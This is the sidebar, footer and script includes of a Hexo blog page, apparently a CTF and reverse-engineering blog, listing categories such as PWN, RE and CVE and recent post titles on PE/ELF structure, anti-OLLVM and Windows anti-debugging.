    <h3 class="widget-title">Categories</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CVE/">CVE</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Crypto/">Crypto</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/FE/">FE</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/PWN/">PWN</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/RE/">RE</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/WEB/">WEB</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/balabala/">balabala</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/二进制/">二进制</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/算法/">算法</a></li></ul>
    </div>
  </div>


  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/9012/07/">July 9012</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">July 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/09/">September 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">August 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/05/">May 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/02/">February 2018</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/9012/07/29/杂谈/">写在前面</a>
          </li>
        
          <li>
            <a href="/2019/07/29/pe-elf/">pe-elf文件结构解析</a>
          </li>
        
          <li>
            <a href="/2019/07/29/ollvm/">anti-ollvm</a>
          </li>
        
          <li>
            <a href="/2019/07/29/io_file/">io_file学习</a>
          </li>
        
          <li>
            <a href="/2019/07/29/windows/">windows反调试总结</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2019 John Doe<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  <script src="/fancybox/jquery.fancybox.pack.js"></script>


<script src="/js/script.js"></script>



  </div>
</body>
</html>